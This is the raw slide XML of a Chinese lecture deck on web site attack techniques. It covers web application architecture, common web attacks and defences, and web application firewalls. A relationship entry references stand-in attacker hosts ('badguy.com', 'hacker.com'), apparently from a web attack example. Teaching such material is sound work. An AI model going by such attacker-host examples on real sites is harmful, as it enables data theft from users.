            <a:pPr algn="ctr"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badguy.com/info.p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hacker.com/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image65.jpe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w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171574" y="1866900"/>
            <a:ext cx="7362825" cy="1143000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第 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>11</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 章    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网站攻击技术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" name="图片 4" descr="27182921_086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85975" y="3395663"/>
            <a:ext cx="4829175" cy="2490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666" name="Line 2"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm flipV="1">
            <a:off x="1553830" y="4011796"/>
            <a:ext cx="6253738" cy="31621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77671" name="Rectangle 7"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm rot="3419336">
            <a:off x="1261728" y="1900301"/>
            <a:ext cx="479425" cy="520700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="669900"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:miter lim="800000"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rgbClr val="669900"/>
            </a:extrusionClr>
          </a:sp3d>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchor="ctr">
            <a:flatTx/>
          </a:bodyPr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77672" name="Text Box 8"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="1338692" y="1939988"/>
            <a:ext cx="301685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kumimoji="0" lang="en-US" altLang="zh-CN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</a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1777673" name="Line 9"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm flipV="1">
            <a:off x="1536366" y="2482360"/>
            <a:ext cx="6253738" cy="24365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77674" name="Text Box 10"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="2104691" y="1851715"/>
            <a:ext cx="5685413" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF6600"/>
          </a:solidFill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Web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应用体系结构脆弱性分析</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1777675" name="Text Box 11"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="2122155" y="3421583"/>
            <a:ext cx="570287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常见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Web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应用攻击及防范</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1777676" name="Rectangle 1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/>
              <a:t>内容提纲</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1777679" name="Rectangle 15"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm rot="3419336">
            <a:off x="1279192" y="3448105"/>
            <a:ext cx="479425" cy="520700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="9369E7"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:miter lim="800000"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rgbClr val="9369E7"/>
            </a:extrusionClr>
          </a:sp3d>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchor="ctr">
            <a:flatTx/>
          </a:bodyPr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77680" name="Text Box 16"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="1356156" y="3468742"/>
            <a:ext cx="301685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kumimoji="0" lang="en-US" altLang="zh-CN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gray">
          <a:xfrm rot="3419336">
            <a:off x="1242678" y="5134070"/>
            <a:ext cx="479425" cy="520700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="669900"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:miter lim="800000"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rgbClr val="669900"/>
            </a:extrusionClr>
          </a:sp3d>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchor="ctr">
            <a:flatTx/>
          </a:bodyPr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gray">
          <a:xfrm>
            <a:off x="2122155" y="5157837"/>
            <a:ext cx="5685413" cy="57943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Web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应用防火墙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WAF</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US" sz="3200" dirty="0"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gray">
          <a:xfrm>
            <a:off x="1346628" y="5165820"/>
            <a:ext cx="301686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kumimoji="0" lang="en-US" altLang="zh-CN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</a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Line 6"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm flipV="1">
            <a:off x="1522078" y="5673819"/>
            <a:ext cx="6268026" cy="46037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push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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>应用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2430463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Web Applications</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>: Software applications that interact with users or other applications using HTTP or HTTPS</a:t>
            </a:r>
          </a:p>
          <a:p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Web Application Vulnerabilities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564" name="Text Box 4"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1187450" y="3768725"/>
            <a:ext cx="7489825" cy="9556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Weakness in custom Web Application, architecture, design, configuration, or code.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5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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>应用程序</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>体系结构</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="408580" name="Rectangle 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="107950" y="3213100"/>
            <a:ext cx="863600" cy="64770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Web</a:t>
            </a:r>
          </a:p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客户端  </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="408581" name="Rectangle 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3059113" y="3213100"/>
            <a:ext cx="1008062" cy="64770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Web</a:t>
            </a:r>
          </a:p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服务器 </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="408582" name="Rectangle 6"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4716463" y="2276475"/>
            <a:ext cx="1079500" cy="64770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Web</a:t>
            </a:r>
          </a:p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应用程序 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08583" name="Rectangle 7"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4716463" y="3213100"/>
            <a:ext cx="1079500" cy="64770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Web</a:t>
            </a:r>
          </a:p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应用程序 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08584" name="Rectangle 8"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4716463" y="4221163"/>
            <a:ext cx="1079500" cy="64770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Web</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr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应用程序 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08585" name="AutoShape 9"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="5400000">
            <a:off x="1871663" y="2962275"/>
            <a:ext cx="360362" cy="1150938"/>
          </a:xfrm>
          <a:prstGeom prst="can">
            <a:avLst>
              <a:gd name="adj" fmla="val 79846"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="99CCFF">
              <a:alpha val="50000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw dist="35921" dir="2700000" algn="ctr" rotWithShape="0">
              <a:schemeClr val="bg2"/>
            </a:outerShdw>
          </a:effectLst>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rot="10800000" vert="eaVert" wrap="none" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>传输层</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="2" name="Group 13"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="6581775" y="2736850"/>
            <a:ext cx="1878013" cy="792163"/>
            <a:chOff x="4146" y="1724"/>
            <a:chExt cx="1183" cy="499"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="408588" name="AutoShape 12"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4830" y="1724"/>
              <a:ext cx="499" cy="499"/>
            </a:xfrm>
            <a:prstGeom prst="can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数据库</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US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</a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="408587" name="AutoShape 11"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="16200000">
              <a:off x="4417" y="1621"/>
              <a:ext cx="223" cy="765"/>
            </a:xfrm>
            <a:prstGeom prst="can">
              <a:avLst>
                <a:gd name="adj" fmla="val 85762"/>
              </a:avLst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vert="eaVert" wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>连接器</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t> </a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="3" name="Group 14"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="6588125" y="3860800"/>
            <a:ext cx="1878013" cy="792163"/>
            <a:chOff x="4146" y="1724"/>
            <a:chExt cx="1183" cy="499"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="408591" name="AutoShape 15"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4830" y="1724"/>
              <a:ext cx="499" cy="499"/>
            </a:xfrm>
            <a:prstGeom prst="can">
              <a:avLst>
                <a:gd name="adj" fmla="val 25000"/>
              </a:avLst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数据库</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1">
                  <a:solidFill>
                    <a:srgbClr val="0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</a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="408592" name="AutoShape 16"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="16200000">
              <a:off x="4417" y="1621"/>
              <a:ext cx="223" cy="765"/>
            </a:xfrm>
            <a:prstGeom prst="can">
              <a:avLst>
                <a:gd name="adj" fmla="val 85762"/>
              </a:avLst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vert="eaVert" wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>连接器</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t> </a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="408593" name="AutoShape 17"/>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks noChangeShapeType="1"/>
            <a:stCxn id="408582" idx="3"/>
            <a:endCxn id="408587" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5795963" y="2600325"/>
            <a:ext cx="787400" cy="58261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408594" name="AutoShape 18"/>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks noChangeShapeType="1"/>
            <a:stCxn id="408583" idx="3"/>
            <a:endCxn id="408587" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipV="1">
            <a:off x="5795963" y="3182938"/>
            <a:ext cx="787400" cy="354012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408595" name="AutoShape 19"/>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks noChangeShapeType="1"/>
            <a:endCxn id="408592" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5867400" y="3573463"/>
            <a:ext cx="722313" cy="73342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408596" name="AutoShape 20"/>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks noChangeShapeType="1"/>
            <a:stCxn id="408584" idx="3"/>
            <a:endCxn id="408592" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipV="1">
            <a:off x="5795963" y="4306888"/>
            <a:ext cx="793750" cy="23812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408597" name="AutoShape 21"/>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks noChangeShapeType="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipV="1">
            <a:off x="4211638" y="2708275"/>
            <a:ext cx="431800" cy="72072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408598" name="AutoShape 22"/>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks noChangeShapeType="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4211638" y="3573463"/>
            <a:ext cx="431800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408599" name="AutoShape 23"/>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks noChangeShapeType="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4211638" y="3789363"/>
            <a:ext cx="431800" cy="792162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</p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="408600" name="Line 24"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="990600" y="3429000"/>
            <a:ext cx="504825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8601" name="Line 25"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2411413" y="3429000"/>
            <a:ext cx="647700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8602" name="Line 26"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2411413" y="3644900"/>
            <a:ext cx="647700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8603" name="Line 27"/>
          <p:cNvSpPr>
            <a:spLocks noChangeShapeType="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="1">
            <a:off x="981075" y="3644900"/>
            <a:ext cx="504825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08607" name="AutoShape 31"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="34924" y="1773238"/>
            <a:ext cx="1089025" cy="1000125"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val -2602"/>
              <a:gd name="adj2" fmla="val 86824"/>
            </a:avLst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IE, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Chrome</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="16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,</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="16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algn="ctr" eaLnBrk="0" hangingPunct="0"/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Firefox,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/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etc.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="408608" name="AutoShape 32"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1290637" y="1830388"/>
            <a:ext cx="1500188" cy="1000125"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val -44338"/>
              <a:gd name="adj2" fmla="val 107776"/>
            </a:avLst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en-US" altLang="zh-CN" sz="16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HTTP/HTTPS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="16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algn="ctr" eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>请求</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="16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08609" name="AutoShape 33"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="900113" y="4365625"/>
            <a:ext cx="914400" cy="1000125"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val 43231"/>
              <a:gd name="adj2" fmla="val -94125"/>
            </a:avLst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FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>明文或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SSL</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="408610" name="AutoShape 34"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1908175" y="4373563"/>
            <a:ext cx="1368425" cy="1000125"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val 12296"/>
              <a:gd name="adj2" fmla="val -111269"/>
            </a:avLst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HTTP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>响应</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/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( HTML, JavaScript, etc.)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="408612" name="AutoShape 36"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2987675" y="1773238"/>
            <a:ext cx="1219200" cy="990600"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val -8204"/>
              <a:gd name="adj2" fmla="val 90384"/>
            </a:avLst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/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0">
              <a:buFontTx/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b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Apache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IIS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etc.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="408613" name="AutoShape 37"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3779838" y="4652963"/>
            <a:ext cx="838200" cy="1889125"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val 60417"/>
              <a:gd name="adj2" fmla="val -85125"/>
            </a:avLst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/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0">
              <a:buFontTx/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b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Perl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C++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CGI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Java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ASP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PHP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etc.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="408614" name="AutoShape 38"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6227763" y="5157788"/>
            <a:ext cx="1008062" cy="1133475"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val 38977"/>
              <a:gd name="adj2" fmla="val -96500"/>
            </a:avLst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/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0">
              <a:buFontTx/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b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ADO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ODBC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JDBC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etc.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="408615" name="AutoShape 39"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6804025" y="1341438"/>
            <a:ext cx="1512888" cy="863600"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val 27648"/>
              <a:gd name="adj2" fmla="val 96690"/>
            </a:avLst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/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0">
              <a:buFontTx/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1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Oracle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SQL Server</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0">
              <a:buFontTx/>
              <a:buChar char="•"/>
            </a:pPr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0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0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0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0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0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607" grpId="0" animBg="1"/>
      <p:bldP spid="408608" grpId="0" animBg="1"/>
      <p:bldP spid="408609" grpId="0" animBg="1"/>
      <p:bldP spid="408610" grpId="0" animBg="1"/>
      <p:bldP spid="408612" grpId="0" animBg="1"/>
      <p:bldP spid="408613" grpId="0" animBg="1"/>
